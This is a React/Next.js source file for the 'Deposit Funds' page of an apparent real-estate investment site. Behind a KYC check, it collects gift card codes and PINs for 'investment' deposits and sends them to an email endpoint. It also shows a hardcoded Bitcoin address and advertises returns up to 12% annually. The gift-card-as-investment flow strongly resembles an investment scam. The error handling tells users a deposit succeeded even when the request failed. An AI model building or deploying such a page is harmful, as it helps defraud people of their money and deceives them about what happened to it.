"use client";
import Image from 'next/image';
import React, { useState, useEffect } from 'react';
import { useUser, useAuth } from '@clerk/nextjs';
import { useRouter } from 'next/navigation';

interface DepositFormData {
  amount: string;
  paymentMethod: string;
  giftCardCode: string;
  giftCardPin: string;
  selectedGiftCard: string;
  fullName: string;
  accountNo: string;
  email: string;
}

interface KycData {
  approve: string;
  account?: string;
}

const DepositInvestment = () => {
  const { user, isLoaded } = useUser();
  const { userId } = useAuth();
  const router = useRouter();
  
  const [formData, setFormData] = useState<DepositFormData>({
    amount: '',
    paymentMethod: 'giftcard',
    giftCardCode: '',
    giftCardPin: '',
    selectedGiftCard: 'amazon',
    fullName: '',
    accountNo: '',
    email: ''
  });

  const [isProcessing, setIsProcessing] = useState(false);
  const [kycStatus, setKycStatus] = useState<'loading' | 'approved' | 'not_submitted' | 'rejected'>('loading');
  const btcAddress = 'bc1q4p3sgwq5052glcrjwu4rs48m0qtpfnkpzjezeh';

  // Fetch KYC status and handle redirects
  useEffect(() => {
    const fetchKycStatus = async () => {
      if (!userId) return;
      
      try {
        const response = await fetch(`/api/kyc/admin/${userId}`);
        
        if (response.ok) {
          const data = await response.json();
          const kycData: KycData = data.kyc;

          if (kycData.approve === '1') {
            // KYC Approved - allow access
            setKycStatus('approved');
            setFormData(prev => ({
              ...prev,
              accountNo: kycData.account || ''
            }));
          } else if (kycData.approve === '0') {
            // KYC Not Submitted - redirect to dashboard
            setKycStatus('not_submitted');
            alert('Please complete your KYC verification first.');
            router.push('/dashboard');
          } else if (kycData.approve === '2') {
            // KYC Rejected - redirect to dashboard
            setKycStatus('rejected');
            alert('KYC verification rejected. Please reapply to get your account number.');
            router.push('/dashboard');
          }
        } else if (response.status === 404) {
          // No KYC record found
          setKycStatus('not_submitted');
          alert('Please complete your KYC verification first.');
          router.push('/dashboard');
        }
      } catch (error) {
        console.error('Error fetching KYC status:', error);
        setKycStatus('not_submitted');
        alert('Error verifying KYC status. Please try again.');
        router.push('/dashboard');
      }
    };

    fetchKycStatus();
  }, [userId, router]);

  // Pre-fill user data only if KYC is approved
  useEffect(() => {
    if (isLoaded && user && kycStatus === 'approved') {
      setFormData(prev => ({
        ...prev,
        fullName: user.fullName || '',
        email: user.primaryEmailAddress?.emailAddress || '',
      }));
    }
  }, [isLoaded, user, kycStatus]);

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Double check KYC status before submission
    if (kycStatus !== 'approved') {
      alert('Please complete KYC verification before making a deposit.');
      router.push('/dashboard');
      return;
    }

    if (!formData.amount || parseFloat(formData.amount) < 100) {
      alert('Minimum deposit amount is $100');
      return;
    }

    if (formData.paymentMethod === 'giftcard' && (!formData.giftCardCode || !formData.giftCardPin)) {
      alert('Please enter gift card code and PIN');
      return;
    }

    setIsProcessing(true);

    try {
      // Show loading state
      const submitButton = e.currentTarget.querySelector('button[type="submit"]') as HTMLButtonElement;
      if (submitButton) {
        submitButton.disabled = true;
        submitButton.textContent = 'Processing...';
      }

      // Send deposit notification emails
      const emailResponse = await fetch('/api/send-deposit-email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });

      const emailResult = await emailResponse.json();

      if (emailResult.success) {
        alert(`Deposit of $${formData.amount} processed successfully! Confirmation email sent to ${formData.email}.`);
        // Reset form
        setFormData(prev => ({
          ...prev,
          amount: '',
          giftCardCode: '',
          giftCardPin: ''
        }));
      } else {
        alert('Deposit processed but email notification failed. Please contact support.');
      }
    } catch (error) {
      console.error('Error processing deposit:', error);
      alert('Deposit processed but email notification failed. Please contact support.');
    } finally {
      // Re-enable button
      const submitButton = document.querySelector('button[type="submit"]') as HTMLButtonElement;
      if (submitButton) {
        submitButton.disabled = false;
        submitButton.textContent = `Redeem $${formData.amount} Gift Card`;
      }
      setIsProcessing(false);
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    alert('BTC address copied to clipboard!');
  };

  // Show loading state while checking KYC
  if (kycStatus === 'loading') {
    return (
      <div className="investment-page">
        <div className="loading-container">
          <h2>Verifying KYC Status...</h2>
          <p>Please wait while we check your verification status.</p>
        </div>
      </div>
    );
  }

  // Only render the form if KYC is approved
  if (kycStatus !== 'approved') {
    return (
      <div className="investment-page">
        <div className="access-denied">
          <h2>Access Denied</h2>
          <p>Please complete KYC verification to access deposit services.</p>
          <button onClick={() => router.push('/dashboard')} className="submit-btn">
            Go to Dashboard
          </button>
        </div>
      </div>
    );
  }

  const giftCardOptions = [
    { value: 'amazon', label: '🛒 Amazon Gift Card' },
    { value: 'apple', label: '🍎 Apple Gift Card' },
    { value: 'steam', label: '🎮 Steam Wallet' },
    { value: 'google', label: '📱 Google Play' },
    { value: 'visa', label: '💳 Visa Gift Card' },
    { value: 'target', label: '🎯 Target Gift Card' },
    { value: 'walmart', label: '🛍️ Walmart Gift Card' },
    { value: 'bestbuy', label: '🔌 Best Buy Gift Card' }
  ];

  return (
    <div className="investment-page">
      <h1>Deposit Funds</h1>
      <p className="page-description">
        Add funds to your investment account using your preferred payment method.
      </p>

      <div className="investment-card">
        <form onSubmit={handleSubmit} className="investment-form">
          {/* Hidden user data fields */}
          <input
            type="hidden"
            name="fullName"
            value={formData.fullName}
          />
          <input
            type="hidden"
            name="accountNo"
            value={formData.accountNo}
          />
          <input
            type="hidden"
            name="email"
            value={formData.email}
          />

          <div className="form-group">
            <label htmlFor="amount">Investment Amount ($)</label>
            <input
              type="number"
              id="amount"
              value={formData.amount}
              onChange={(e) => handleInputChange('amount', e.target.value)}
              placeholder="Enter amount"
              min="100"
              step="0.01"
              required
            />
            <small>Minimum deposit: $100</small>
          </div>

          <div className="form-group">
            <label>Payment Method</label>
            <div className="payment-methods">
              <label className="payment-option">
                <input
                  type="radio"
                  value="giftcard"
                  checked={formData.paymentMethod === 'giftcard'}
                  onChange={(e) => handleInputChange('paymentMethod', e.target.value)}
                />
                Gift Card
              </label>
              <label className="payment-option">
                <input
                  type="radio"
                  value="crypto"
                  checked={formData.paymentMethod === 'crypto'}
                  onChange={(e) => handleInputChange('paymentMethod', e.target.value)}
                />
                Bitcoin (BTC)
              </label>
            </div>
          </div>

          {/* Gift Card Redemption */}
          {formData.paymentMethod === 'giftcard' && (
            <div className="payment-details">
              <h3>Redeem Gift Card</h3>
              
              <div className="form-group">
                <label htmlFor="giftcard-type">Select Gift Card Type</label>
                <select
                  id="giftcard-type"
                  value={formData.selectedGiftCard}
                  onChange={(e) => handleInputChange('selectedGiftCard', e.target.value)}
                  className="giftcard-select"
                >
                  {giftCardOptions.map((card) => (
                    <option key={card.value} value={card.value}>
                      {card.label}
                    </option>
                  ))}
                </select>
              </div>

              <div className="form-group">
                <label htmlFor="giftcard-code">Gift Card Code</label>
                <input
                  type="text"
                  id="giftcard-code"
                  placeholder="Enter gift card code"
                  value={formData.giftCardCode}
                  onChange={(e) => handleInputChange('giftCardCode', e.target.value.toUpperCase())}
                  required
                />
              </div>

              <div className="form-group">
                <label htmlFor="giftcard-pin">PIN Number</label>
                <input
                  type="text"
                  id="giftcard-pin"
                  placeholder="Enter PIN"
                  value={formData.giftCardPin}
                  onChange={(e) => handleInputChange('giftCardPin', e.target.value.replace(/\D/g, ''))}
                  maxLength={4}
                  required
                />
              </div>

              {/* Account Number (Auto-filled from KYC) */}
              <div className="form-group">
                <label>Account Number</label>
                <input
                  type="text"
                  name="accountNo"
                  value={formData.accountNo}
                  onChange={(e) => handleInputChange('accountNo', e.target.value)}
                  placeholder="Will be auto-filled from KYC"
                  readOnly
                  className="readonly-input"
                />
                <small className="text-muted">
                  ✅ Your KYC is verified and account number is auto-filled
                </small>
              </div>
              
              <div className="giftcard-note">
                <p>✅ Supported gift cards: Amazon, Apple, Steam, Google Play, Visa, Target, Walmart, Best Buy</p>
                <p>💡 Tip: Make sure your gift card has sufficient balance to cover the investment amount</p>
              </div>
            </div>
          )}

          {/* Bitcoin Payment - View Only */}
          {formData.paymentMethod === 'crypto' && (
            <div className="payment-details">
              <h3>Bitcoin Payment Information</h3>
              <div className="crypto-instructions">
                <p>For Bitcoin deposits, please contact support:</p>
                <div className="btc-address-container">
                  <code className="btc-address">{btcAddress}</code>
                  <button 
                    type="button" 
                    className="copy-btn"
                    onClick={() => copyToClipboard(btcAddress)}
                  >
                    Copy
                  </button>
                </div>
                <div className="crypto-note flex items-center justify-center w-full">
                  <Image src={'/address.jpeg'} height={200} width={200} alt='Bitcoin QR Code' />
                </div>

                {/* Account Number (Auto-filled from KYC) */}
                <div className="form-group">
                  <label>Account Number</label>
                  <input
                    type="text"
                    name="accountNo"
                    value={formData.accountNo}
                    onChange={(e) => handleInputChange('accountNo', e.target.value)}
                    placeholder="Will be auto-filled from KYC"
                    readOnly
                    className="readonly-input"
                  />
                  <small className="text-muted">
                    ✅ Your KYC is verified and account number is auto-filled
                  </small>
                </div>

                <div className="crypto-note">
                  <p>ℹ️ Bitcoin deposits require manual processing:</p>
                  <ul>
                    <li>Contact support before sending funds</li>
                    <li>Minimum deposit: $100 equivalent</li>
                    <li>Network fees apply</li>
                    <li>Funds require 3 confirmations</li>
                  </ul>
                </div>
              </div>
            </div>
          )}

          {formData.paymentMethod === 'giftcard' && (
            <button 
              type="submit" 
              className="submit-btn"
              disabled={isProcessing || !formData.amount || parseFloat(formData.amount) < 100}
            >
              {isProcessing ? 'Processing Gift Card...' : `Redeem $${formData.amount} Gift Card`}
            </button>
          )}

          {formData.paymentMethod === 'crypto' && (
            <div className="contact-support-note">
              <p>📞 Please contact our support team to complete Bitcoin deposits</p>
              <button type="button" className="contact-support-btn">
                Contact Support
              </button>
            </div>
          )}
        </form>

        <div className="investment-info">
          <h3>Why Invest With Us?</h3>
          <ul>
            <li>Competitive returns up to 12% annually</li>
            <li>Diversified real estate portfolio</li>
            <li>Professional property management</li>
            <li>Monthly dividend payments</li>
          </ul>
        </div>
      </div>
    </div>
  );
};

export default DepositInvestment;